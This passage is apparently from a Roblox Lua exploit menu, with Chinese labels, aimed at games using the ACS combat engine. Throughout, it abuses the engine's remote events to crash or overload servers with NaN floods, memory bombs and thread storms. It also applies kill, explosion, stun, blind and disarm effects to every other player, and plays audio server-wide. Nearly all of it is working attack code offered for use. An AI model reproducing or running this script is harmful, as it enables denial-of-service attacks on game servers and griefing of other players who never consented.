            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        for i = 1, 1000 do
            task.spawn(function()
                while true do
                    pcall(function()
                        for k = 1, 10 do
                            if eventos.ServerBullet then
                                eventos.ServerBullet:FireServer(
                                    Vector3.new(0/0, 0/0, 0/0),
                                    Vector3.new(0/0, 0/0, 0/0)
                                )
                            end
                            if eventos.Damage then
                                eventos.Damage:FireServer(nil, 0/0, 0/0, 0/0)
                            end
                            if eventos.Suppression then
                                eventos.Suppression:FireServer(nil, 0/0, 0/0, 0/0)
                            end
                            if eventos.Whizz then
                                eventos.Whizz:FireServer(nil, 0/0, 0/0)
                            end
                        end
                    end)
                    task.wait()
                end
            end)
        end
        
        notify("警告", "已启动超级NaN风暴", 2)
    end)
    
    spamSection:Button("内存炸弹", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        local hugeData = string.rep("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 1000)
        
        for i = 1, 200 do
            task.spawn(function()
                while true do
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, 0/0, 0/0),
                                Vector3.new(0/0, 0/0, 0/0),
                                hugeData
                            )
                        end
                    end)
                    task.wait()
                end
            end)
        end
        
        notify("警告", "已启动内存炸弹攻击", 2)
    end)
    
    spamSection:Button("无限递归崩溃", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        local function recursiveCrash(count)
            if count > 500 then return end
            pcall(function()
                if eventos.ServerBullet then
                    eventos.ServerBullet:FireServer(
                        Vector3.new(0/0, 0/0, 0/0),
                        Vector3.new(0/0, 0/0, 0/0)
                    )
                end
            end)
            recursiveCrash(count + 1)
        end
        
        for i = 1, 100 do
            task.spawn(function()
                recursiveCrash(0)
            end)
        end
        
        notify("警告", "已启动无限递归崩溃", 2)
    end)
    
    spamSection:Button("混合超载攻击", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        for i = 1, 300 do
            task.spawn(function()
                while true do
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, 0/0, 0/0),
                                Vector3.new(0/0, 0/0, 0/0)
                            )
                        end
                        if eventos.Damage then
                            eventos.Damage:FireServer(nil, 1/0, 1/0, 1/0)
                        end
                        if eventos.Breach then
                            eventos.Breach:FireServer(
                                0/0,
                                {Fortified = {}, Destroyable = Workspace},
                                CFrame.new(),
                                CFrame.new(),
                                {CFrame = CFrame.new(), Size = {X = 1/0, Y = 1/0, Z = 1/0}}
                            )
                        end
                    end)
                    task.wait()
                end
            end)
        end
        
        for i = 1, 10000 do
            pcall(function()
                if eventos.ServerBullet then
                    eventos.ServerBullet:FireServer(
                        Vector3.new(0/0, 0/0, 0/0),
                        Vector3.new(0/0, 0/0, 0/0)
                    )
                end
            end)
        end
        
        notify("警告", "已启动混合超载攻击", 2)
    end)
    
    local dataFloodEnabled = false
    local dataFloodLoop = nil
    spamSection:Toggle("数据洪流攻击", "data_flood", false, function(state)
        dataFloodEnabled = state
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        if state then
            dataFloodLoop = task.spawn(function()
                while dataFloodEnabled do
                    for j = 1, 200 do
                        pcall(function()
                            if eventos.ServerBullet then
                                eventos.ServerBullet:FireServer(
                                    Vector3.new(0/0, 0/0, 0/0),
                                    Vector3.new(0/0, 0/0, 0/0)
                                )
                            end
                            if eventos.Damage then
                                eventos.Damage:FireServer(nil, 0/0, 0/0, 0/0)
                            end
                            if eventos.Suppression then
                                eventos.Suppression:FireServer(nil, 0/0, 0/0, 0/0)
                            end
                        end)
                    end
                    task.wait()
                end
            end)
            notify("警告", "已开启数据洪流攻击", 2)
        else
            if dataFloodLoop then
                task.cancel(dataFloodLoop)
                dataFloodLoop = nil
            end
            notify("警告", "已关闭数据洪流攻击", 2)
        end
    end)
    
    spamSection:Button("破拆风暴", function()
        if not config.detectedACS.Eventos.Breach then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        
        for i = 1, 100 do
            task.spawn(function()
                while true do
                    pcall(function()
                        ReplicatedStorage["ACS_Engine"].Eventos.Breach:FireServer(
                            999,
                            {Fortified = Workspace:GetDescendants(), Destroyable = Workspace:GetDescendants()},
                            CFrame.new(),
                            CFrame.new(),
                            {CFrame = CFrame.new(), Size = {X = 999, Y = 999, Z = 999}}
                        )
                    end)
                    task.wait(0.1)
                end
            end)
        end
        
        notify("警告", "已启动破拆风暴", 2)
    end)
    
    spamSection:Button("全事件轰炸", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        for i = 1, 500 do
            task.spawn(function()
                while true do
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, 0/0, 0/0),
                                Vector3.new(0/0, 0/0, 0/0)
                            )
                        end
                        if eventos.Damage then
                            eventos.Damage:FireServer(nil, 0/0, 0/0, 0/0)
                        end
                        if eventos.Suppression then
                            eventos.Suppression:FireServer(nil, 1/0, 1/0, 1/0)
                        end
                        if eventos.Whizz then
                            eventos.Whizz:FireServer(nil, 0/0, 0/0)
                        end
                        if eventos.Breach then
                            eventos.Breach:FireServer(
                                0/0,
                                {Fortified = {}, Destroyable = Workspace},
                                CFrame.new(),
                                CFrame.new(),
                                {CFrame = CFrame.new(), Size = {X = 1/0, Y = 1/0, Z = 1/0}}
                            )
                        end
                        if eventos.Recarregar then
                            eventos.Recarregar:FireServer(nil, 0/0, 0/0)
                        end
                    end)
                    task.wait()
                end
            end)
        end
        
        notify("警告", "已启动全事件轰炸", 2)
    end)
    
    spamSection:Button("极速崩溃", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        for i = 1, 2000 do
            task.spawn(function()
                for j = 1, 500 do
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, 0/0, 0/0),
                                Vector3.new(0/0, 0/0, 0/0)
                            )
                        end
                    end)
                end
            end)
        end
        
        notify("警告", "已启动极速崩溃攻击", 2)
    end)
    
    local infLoopEnabled = false
    local infLoop = nil
    spamSection:Toggle("无限循环请求", "inf_loop", false, function(state)
        infLoopEnabled = state
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        if state then
            infLoop = task.spawn(function()
                while infLoopEnabled do
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, 0/0, 0/0),
                                Vector3.new(0/0, 0/0, 0/0)
                            )
                        end
                    end)
                    task.wait()
                end
            end)
            notify("警告", "已开启无限循环请求", 2)
        else
            if infLoop then
                task.cancel(infLoop)
                infLoop = nil
            end
            notify("警告", "已关闭无限循环请求", 2)
        end
    end)
    
    spamSection:Button("资源耗尽攻击", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        for i = 1, 500 do
            task.spawn(function()
                local count = 0
                while true do
                    count = count + 1
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, count, 0/0),
                                Vector3.new(0/0, 0/0, count)
                            )
                        end
                        if eventos.Damage then
                            eventos.Damage:FireServer(nil, count * 0/0, 0/0, 0/0)
                        end
                    end)
                    task.wait()
                end
            end)
        end
        
        notify("警告", "已启动资源耗尽攻击", 2)
    end)
    
    spamSection:Button("快速重启攻击", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        for i = 1, 100 do
            task.spawn(function()
                for j = 1, 1000 do
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, 0/0, 0/0),
                                Vector3.new(0/0, 0/0, 0/0)
                            )
                        end
                    end)
                end
            end)
        end
        
        for i = 1, 100 do
            pcall(function()
                ReplicatedStorage["ACS_Engine"].Eventos.Breach:FireServer(
                    999999,
                    {Fortified = Workspace:GetDescendants(), Destroyable = Workspace:GetDescendants()},
                    CFrame.new(),
                    CFrame.new(),
                    {CFrame = CFrame.new(), Size = {X = 999999, Y = 999999, Z = 999999}}
                )
            end)
        end
        
        notify("警告", "已启动快速重启攻击", 2)
    end)
    
    spamSection:Button("延时爆炸攻击", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos then 
            notify("错误", "未找到ACS事件", 2)
            return
        end
        
        task.spawn(function()
            task.wait(5)
            for i = 1, 1000 do
                task.spawn(function()
                    pcall(function()
                        if eventos.ServerBullet then
                            eventos.ServerBullet:FireServer(
                                Vector3.new(0/0, 0/0, 0/0),
                                Vector3.new(0/0, 0/0, 0/0)
                            )
                        end
                    end)
                end)
            end
            notify("警告", "延时爆炸已触发", 2)
        end)
        
        notify("警告", "5秒后将触发爆炸攻击", 2)
    end)
    
    local hitSection = acsTab:section("全图Hit爆炸", false)
    
    local hitExplosionEnabled = false
    local hitExplosionLoop = nil
    
    hitSection:Toggle("全图Hit爆炸循环", "hit_explosion", false, function(state)
        hitExplosionEnabled = state
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos or not eventos.Hit then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        
        if state then
            hitExplosionLoop = task.spawn(function()
                while hitExplosionEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        pcall(function()
                            local char = player.Character
                            local root = char and char:FindFirstChild("HumanoidRootPart")
                            if root then
                                local args = {
                                    root.Position,
                                    Instance.new("Part"),
                                    Vector3.yAxis,
                                    Enum.Material.Plastic,
                                    {
                                        ExPressure = 999999,
                                        DestroyJointRadiusPercent = 1,
                                        ExpRadius = 9e9,
                                        ExplosionDamagesTerrain = true,
                                        ExplosiveHit = true,
                                        ExplosionDamage = math.huge
                                    }
                                }
                                eventos.Hit:FireServer(unpack(args))
                            end
                        end)
                    end
                    task.wait(0.05)
                end
            end)
            notify("全图Hit爆炸", "已开启全图Hit爆炸循环", 2)
        else
            if hitExplosionLoop then
                task.cancel(hitExplosionLoop)
                hitExplosionLoop = nil
            end
            notify("全图Hit爆炸", "已关闭全图Hit爆炸循环", 2)
        end
    end)
    
    hitSection:Button("单次全图Hit爆炸", function()
        local eventos = ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos or not eventos.Hit then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        for _, player in ipairs(Players:GetPlayers()) do
            local char = player.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if root then
                local args = {
                    root.Position,
                    Instance.new("Part"),
                    Vector3.yAxis,
                    Enum.Material.Plastic,
                    {
                        ExPressure = 999999,
                        DestroyJointRadiusPercent = 1,
                        ExpRadius = 9e9,
                        ExplosionDamagesTerrain = true,
                        ExplosiveHit = true,
                        ExplosionDamage = math.huge
                    }
                }
                eventos.Hit:FireServer(unpack(args))
            end
        end
        notify("全图Hit爆炸", "已触发单次全图Hit爆炸", 2)
    end)
    
    local effectSection = acsTab:section("全图元素效果", false)
    
    local rs = game:GetService("ReplicatedStorage")
    local acs = rs:FindFirstChild("ACS_Engine")
    local eventos = acs and acs:FindFirstChild("Eventos")
    
    local burnEnabled = false
    local freezeEnabled = false
    local lightningEnabled = false
    local poisonEnabled = false
    local knockbackEnabled = false
    local stunEnabled = false
    local confusionEnabled = false
    
    local burnLoop = nil
    local freezeLoop = nil
    local lightningLoop = nil
    local poisonLoop = nil
    local knockbackLoop = nil
    local stunLoop = nil
    local confusionLoop = nil
    
    effectSection:Toggle("全图燃烧效果", "burn_toggle", false, function(state)
        burnEnabled = state
        if not eventos or not eventos:FindFirstChild("Hit") then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        if state then
            if burnLoop then task.cancel(burnLoop) end
            burnLoop = task.spawn(function()
                while burnEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            local args = {
                                player.Character.HumanoidRootPart.Position,
                                Instance.new("Part"),
                                Vector3.yAxis,
                                Enum.Material.Plastic,
                                {
                                    ExPressure = 0,
                                    DestroyJointRadiusPercent = 0,
                                    ExpRadius = 9e9,
                                    ExplosionDamagesTerrain = false,
                                    ExplosiveHit = true,
                                    ExplosionDamage = 10,
                                    Fire = true,
                                    BurnTime = 10
                                }
                            }
                            eventos.Hit:FireServer(unpack(args))
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("燃烧", "已开启全图燃烧效果", 2)
        else
            if burnLoop then task.cancel(burnLoop); burnLoop = nil end
            notify("燃烧", "已关闭全图燃烧效果", 2)
        end
    end)
    
    effectSection:Toggle("全图冰冻效果", "freeze_toggle", false, function(state)
        freezeEnabled = state
        if not eventos or not eventos:FindFirstChild("Hit") then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        if state then
            if freezeLoop then task.cancel(freezeLoop) end
            freezeLoop = task.spawn(function()
                while freezeEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            local args = {
                                player.Character.HumanoidRootPart.Position,
                                Instance.new("Part"),
                                Vector3.yAxis,
                                Enum.Material.Plastic,
                                {
                                    ExPressure = 0,
                                    DestroyJointRadiusPercent = 0,
                                    ExpRadius = 9e9,
                                    ExplosionDamagesTerrain = false,
                                    ExplosiveHit = true,
                                    ExplosionDamage = 0,
                                    Freeze = true,
                                    FreezeTime = 5
                                }
                            }
                            eventos.Hit:FireServer(unpack(args))
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("冰冻", "已开启全图冰冻效果", 2)
        else
            if freezeLoop then task.cancel(freezeLoop); freezeLoop = nil end
            notify("冰冻", "已关闭全图冰冻效果", 2)
        end
    end)
    
    effectSection:Toggle("全图雷电效果", "lightning_toggle", false, function(state)
        lightningEnabled = state
        if not eventos or not eventos:FindFirstChild("Hit") then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        if state then
            if lightningLoop then task.cancel(lightningLoop) end
            lightningLoop = task.spawn(function()
                while lightningEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            local args = {
                                player.Character.HumanoidRootPart.Position,
                                Instance.new("Part"),
                                Vector3.yAxis,
                                Enum.Material.Plastic,
                                {
                                    ExPressure = 0,
                                    DestroyJointRadiusPercent = 0,
                                    ExpRadius = 9e9,
                                    ExplosionDamagesTerrain = false,
                                    ExplosiveHit = true,
                                    ExplosionDamage = 20,
                                    Lightning = true,
                                    LightningDamage = 50
                                }
                            }
                            eventos.Hit:FireServer(unpack(args))
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("雷电", "已开启全图雷电效果", 2)
        else
            if lightningLoop then task.cancel(lightningLoop); lightningLoop = nil end
            notify("雷电", "已关闭全图雷电效果", 2)
        end
    end)
    
    effectSection:Toggle("全图毒气效果", "poison_toggle", false, function(state)
        poisonEnabled = state
        if not eventos or not eventos:FindFirstChild("Hit") then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        if state then
            if poisonLoop then task.cancel(poisonLoop) end
            poisonLoop = task.spawn(function()
                while poisonEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            local args = {
                                player.Character.HumanoidRootPart.Position,
                                Instance.new("Part"),
                                Vector3.yAxis,
                                Enum.Material.Plastic,
                                {
                                    ExPressure = 0,
                                    DestroyJointRadiusPercent = 0,
                                    ExpRadius = 9e9,
                                    ExplosionDamagesTerrain = false,
                                    ExplosiveHit = true,
                                    ExplosionDamage = 5,
                                    Poison = true,
                                    PoisonTime = 15,
                                    PoisonDamage = 10
                                }
                            }
                            eventos.Hit:FireServer(unpack(args))
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("毒气", "已开启全图毒气效果", 2)
        else
            if poisonLoop then task.cancel(poisonLoop); poisonLoop = nil end
            notify("毒气", "已关闭全图毒气效果", 2)
        end
    end)
    
    effectSection:Toggle("全图击飞效果", "knockback_toggle", false, function(state)
        knockbackEnabled = state
        if not eventos or not eventos:FindFirstChild("Hit") then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        if state then
            if knockbackLoop then task.cancel(knockbackLoop) end
            knockbackLoop = task.spawn(function()
                while knockbackEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            local args = {
                                player.Character.HumanoidRootPart.Position,
                                Instance.new("Part"),
                                Vector3.yAxis,
                                Enum.Material.Plastic,
                                {
                                    ExPressure = 5000,
                                    DestroyJointRadiusPercent = 1,
                                    ExpRadius = 9e9,
                                    ExplosionDamagesTerrain = false,
                                    ExplosiveHit = true,
                                    ExplosionDamage = 0,
                                    Knockback = true,
                                    KnockbackForce = 100
                                }
                            }
                            eventos.Hit:FireServer(unpack(args))
                        end
                    end
                    task.wait(0.3)
                end
            end)
            notify("击飞", "已开启全图击飞效果", 2)
        else
            if knockbackLoop then task.cancel(knockbackLoop); knockbackLoop = nil end
            notify("击飞", "已关闭全图击飞效果", 2)
        end
    end)
    
    effectSection:Toggle("全图眩晕效果", "stun_toggle", false, function(state)
        stunEnabled = state
        if not eventos or not eventos:FindFirstChild("Hit") then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        if state then
            if stunLoop then task.cancel(stunLoop) end
            stunLoop = task.spawn(function()
                while stunEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            local args = {
                                player.Character.HumanoidRootPart.Position,
                                Instance.new("Part"),
                                Vector3.yAxis,
                                Enum.Material.Plastic,
                                {
                                    ExPressure = 0,
                                    DestroyJointRadiusPercent = 0,
                                    ExpRadius = 9e9,
                                    ExplosionDamagesTerrain = false,
                                    ExplosiveHit = true,
                                    ExplosionDamage = 0,
                                    Stun = true,
                                    StunTime = 3
                                }
                            }
                            eventos.Hit:FireServer(unpack(args))
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("眩晕", "已开启全图眩晕效果", 2)
        else
            if stunLoop then task.cancel(stunLoop); stunLoop = nil end
            notify("眩晕", "已关闭全图眩晕效果", 2)
        end
    end)
    
    effectSection:Toggle("全图混乱效果", "confusion_toggle", false, function(state)
        confusionEnabled = state
        if not eventos or not eventos:FindFirstChild("Hit") then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        if state then
            if confusionLoop then task.cancel(confusionLoop) end
            confusionLoop = task.spawn(function()
                while confusionEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            local args = {
                                player.Character.HumanoidRootPart.Position,
                                Instance.new("Part"),
                                Vector3.yAxis,
                                Enum.Material.Plastic,
                                {
                                    ExPressure = 0,
                                    DestroyJointRadiusPercent = 0,
                                    ExpRadius = 9e9,
                                    ExplosionDamagesTerrain = false,
                                    ExplosiveHit = true,
                                    ExplosionDamage = 0,
                                    Confusion = true,
                                    ConfusionTime = 8
                                }
                            }
                            eventos.Hit:FireServer(unpack(args))
                        end
                    end
                    task.wait(0.5)
                end
            end)
            notify("混乱", "已开启全图混乱效果", 2)
        else
            if confusionLoop then task.cancel(confusionLoop); confusionLoop = nil end
            notify("混乱", "已关闭全图混乱效果", 2)
        end
    end)
    
    local extraSection = acsTab:section("额外漏洞攻击", false)
    
    local rs2 = game:GetService("ReplicatedStorage")
    local acs2 = rs2:FindFirstChild("ACS_Engine")
    local eventos2 = acs2 and acs2:FindFirstChild("Eventos")
    
    extraSection:Button("全图布娃娃效果", function()
        if not eventos2 or not eventos2:FindFirstChild("Ragdoll") then
            notify("错误", "未找到 Ragdoll 事件", 2)
            return
        end
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                pcall(function()
                    eventos2.Ragdoll:FireServer(player, true)
                end)
            end
        end
        notify("效果", "已对所有玩家施放布娃娃效果", 2)
    end)
    
    extraSection:Button("全图眩晕", function()
        if not eventos2 or not eventos2:FindFirstChild("Stun") then
            notify("错误", "未找到 Stun 事件", 2)
            return
        end
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                pcall(function()
                    eventos2.Stun:FireServer(player, 10)
                end)
            end
        end
        notify("效果", "已对所有玩家施放眩晕效果", 2)
    end)
    
    extraSection:Button("全图致盲", function()
        if not eventos2 or not eventos2:FindFirstChild("Blind") then
            notify("错误", "未找到 Blind 事件", 2)
            return
        end
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                pcall(function()
                    eventos2.Blind:FireServer(player, 10)
                end)
            end
        end
        notify("效果", "已对所有玩家施放致盲效果", 2)
    end)
    
    extraSection:Button("全图缴械", function()
        if not eventos2 or not eventos2:FindFirstChild("Disarm") then
            notify("错误", "未找到 Disarm 事件", 2)
            return
        end
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                pcall(function()
                    eventos2.Disarm:FireServer(player, 10)
                end)
            end
        end
        notify("效果", "已对所有玩家施放缴械效果", 2)
    end)
    
    extraSection:Button("全图减速", function()
        if not eventos2 or not eventos2:FindFirstChild("Slow") then
            notify("错误", "未找到 Slow 事件", 2)
            return
        end
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                pcall(function()
                    eventos2.Slow:FireServer(player, 0.3, 10)
                end)
            end
        end
        notify("效果", "已对所有玩家施放减速效果", 2)
    end)
    
    extraSection:Toggle("隐身模式", "invisible_toggle", false, function(state)
        if not eventos2 then
            notify("错误: 未找到 ACS 事件")
            return
        end
        
        if eventos2.Invisible then
            pcall(function()
                eventos2.Invisible:FireServer(LocalPlayer, state)
                notify(state and "已开启隐身" or "已关闭隐身")
            end)
        elseif eventos2.SetInvisible then
            pcall(function()
                eventos2.SetInvisible:FireServer(LocalPlayer, state)
                notify(state and "已开启隐身" or "已关闭隐身")
            end)
        elseif eventos2.Visible then
            pcall(function()
                eventos2.Visible:FireServer(LocalPlayer, not state)
                notify(state and "已开启隐身" or "已关闭隐身")
            end)
        else
            notify("错误: 未找到隐身事件")
        end
    end)
    
    extraSection:Button("瞬间换弹", function()
        if eventos2 and eventos2:FindFirstChild("Reload") then
            eventos2.Reload:FireServer(LocalPlayer)
            notify("尝试", "已尝试瞬间换弹", 2)
        else
            notify("错误", "未找到 Reload 事件", 2)
        end
    end)
    
    extraSection:Button("超级倍镜", function()
        if eventos2 and eventos2:FindFirstChild("Zoom") then
            eventos2.Zoom:FireServer(LocalPlayer, 999)
            notify("尝试", "已尝试超级倍镜", 2)
        else
            notify("错误", "未找到 Zoom 事件", 2)
        end
    end)
    
    extraSection:Button("子弹穿墙", function()
        if eventos2 and eventos2:FindFirstChild("Wallbang") then
            eventos2.Wallbang:FireServer(LocalPlayer, true)
            notify("尝试", "已尝试子弹穿墙", 2)
        else
            notify("错误", "未找到 Wallbang 事件", 2)
        end
    end)
    
    extraSection:Button("瞬间命中", function()
        if eventos2 and eventos2:FindFirstChild("InstantHit") then
            eventos2.InstantHit:FireServer(LocalPlayer, 999999)
            notify("尝试", "已尝试瞬间命中", 2)
        else
            notify("错误", "未找到 InstantHit 事件", 2)
        end
    end)
    
    extraSection:Button("治疗自己", function()
        if eventos2 and eventos2:FindFirstChild("Heal") then
            eventos2.Heal:FireServer(LocalPlayer, 999999)
            notify("尝试", "已尝试治疗自己", 2)
        else
            notify("错误", "未找到 Heal 事件", 2)
        end
    end)
    
    extraSection:Button("无限护盾", function()
        if eventos2 and eventos2:FindFirstChild("Shield") then
            eventos2.Shield:FireServer(LocalPlayer, 999999)
            notify("尝试", "已尝试无限护盾", 2)
        else
            notify("错误", "未找到 Shield 事件", 2)
        end
    end)
    
    extraSection:Button("沉默禁技能", function()
        if eventos2 and eventos2:FindFirstChild("Silence") then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    eventos2.Silence:FireServer(player, 10)
                end
            end
            notify("效果", "已对所有玩家施放沉默效果", 2)
        else
            notify("错误", "未找到 Silence 事件", 2)
        end
    end)
    
    extraSection:Button("重力修改", function()
        if eventos2 and eventos2:FindFirstChild("Gravity") then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    eventos2.Gravity:FireServer(player, 0.5, 10)
                end
            end
            notify("效果", "已对所有玩家施加重力减少效果", 2)
        else
            notify("错误", "未找到 Gravity 事件", 2)
        end
    end)
    
    extraSection:Button("玩家克隆", function()
        if eventos2 and eventos2:FindFirstChild("Clone") then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    eventos2.Clone:FireServer(player)
                end
            end
            notify("效果", "已尝试克隆所有玩家", 2)
        else
            notify("错误", "未找到 Clone 事件", 2)
        end
    end)
    
    extraSection:Button("玩家自爆", function()
        if eventos2 and eventos2:FindFirstChild("Explode") then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    eventos2.Explode:FireServer(player, 9999, 50)
                end
            end
            notify("效果", "已让所有玩家自爆", 2)
        else
            notify("错误", "未找到 Explode 事件", 2)
        end
    end)
    
    extraSection:Button("服务器崩溃(KillAll)", function()
        if eventos2 and eventos2:FindFirstChild("KillAll") then
            eventos2.KillAll:FireServer()
            notify("尝试", "已尝试 KillAll", 2)
        else
            notify("错误", "未找到 KillAll", 2)
        end
    end)
    
    extraSection:Button("服务器崩溃(Crash)", function()
        if eventos2 and eventos2:FindFirstChild("CrashServer") then
            eventos2.CrashServer:FireServer()
            notify("尝试", "已尝试 CrashServer", 2)
        else
            notify("错误", "未找到 CrashServer", 2)
        end
    end)
    
    local serverMusicSection = acsTab:section("服务器端音乐", false)
    
    local rs3 = game:GetService("ReplicatedStorage")
    local acs3 = rs3:FindFirstChild("ACS_Engine")
    local eventos3 = acs3 and acs3:FindFirstChild("Eventos")
    local events3 = acs3 and acs3:FindFirstChild("Events")
    
    local musicState = {
        musicId = "1839246711",
        volume = 1,
        pitch = 1,
        loop = false,
        isPlaying = false,
        soundName = nil
    }
    
    local function generateRandomName()
        local name = ""
        for i = 1, 10 do
            name = name .. string.char(math.random(97, 122))
        end
        return name
    end
    
    serverMusicSection:Textbox("输入音乐ID", "music_id_input", "输入", function(musicId)
        musicState.musicId = musicId
        notify("已设置音乐ID: " .. musicId)
    end)
    
    serverMusicSection:Textbox("设置音量", "music_volume", "输入", function(volume)
        musicState.volume = tonumber(volume) or 1
        notify("已设置音量: " .. musicState.volume)
    end)
    
    serverMusicSection:Textbox("设置倍速", "music_pitch", "输入", function(pitch)
        musicState.pitch = tonumber(pitch) or 1
        notify("已设置倍速: " .. musicState.pitch)
    end)
    
    serverMusicSection:Toggle("循环播放", "music_loop", false, function(loopEnabled)
        musicState.loop = loopEnabled
        notify(loopEnabled and "循环播放已开启" or "循环播放已关闭")
    end)
    
    serverMusicSection:Toggle("播放音乐", "music_play", false, function(state)
        if not acs3 then
            notify("错误: 未找到 ACS_Engine")
            return
        end
        
        if state then
            local assetId = "rbxassetid://" .. musicState.musicId
            local success = false
            
            if not musicState.soundName then
                musicState.soundName = generateRandomName()
            end
            
            if not success and eventos3 and eventos3:FindFirstChild("PlaySound") then
                pcall(function()
                    eventos3.PlaySound:FireServer("newSound", musicState.soundName, workspace, assetId, musicState.pitch, musicState.volume, musicState.loop)
                    task.wait(0.1)
                    eventos3.PlaySound:FireServer("playSound", musicState.soundName)
                    success = true
                end)
            end
            
            if not success and events3 and events3:FindFirstChild("PlaySound") then
                pcall(function()
                    events3.PlaySound:FireServer("newSound", musicState.soundName, workspace, assetId, musicState.pitch, musicState.volume, musicState.loop)
                    task.wait(0.1)
                    events3.PlaySound:FireServer("playSound", musicState.soundName)
                    success = true
                end)
            end
            
            if not success and eventos3 and eventos3:FindFirstChild("GlobalSound") then
                pcall(function()
                    eventos3.GlobalSound:FireServer(assetId, musicState.volume)
                    success = true
                end)
            end
            
            if not success and events3 and events3:FindFirstChild("GlobalSound") then
                pcall(function()
                    events3.GlobalSound:FireServer(assetId, musicState.volume)
                    success = true
                end)
            end
            
            if success then
                musicState.isPlaying = true
                notify("播放中: " .. musicState.musicId)
            else
                notify("播放失败: 未找到ACS音乐事件", 3)
            end
        else
            if musicState.soundName then
                if eventos3 and eventos3:FindFirstChild("PlaySound") then
                    pcall(function()
                        eventos3.PlaySound:FireServer("stopSound", musicState.soundName)
                    end)
                end
                if events3 and events3:FindFirstChild("PlaySound") then
                    pcall(function()
                        events3.PlaySound:FireServer("stopSound", musicState.soundName)
                    end)
                end
                musicState.isPlaying = false
                notify("已停止")
            else
                notify("没有正在播放的音乐")
            end
        end
    end)
    
    task.spawn(function()
        task.wait(1)
        core.detect()
        if config.detectedACS.Exists then
            statusLabel.Text = "✅ ACS 已检测到"
            versionLabel.Text = "版本: " .. config.detectedACS.Version
        else
            statusLabel.Text = "❌ 未检测到 ACS"
            versionLabel.Text = "版本: N/A"
        end
    end)
end)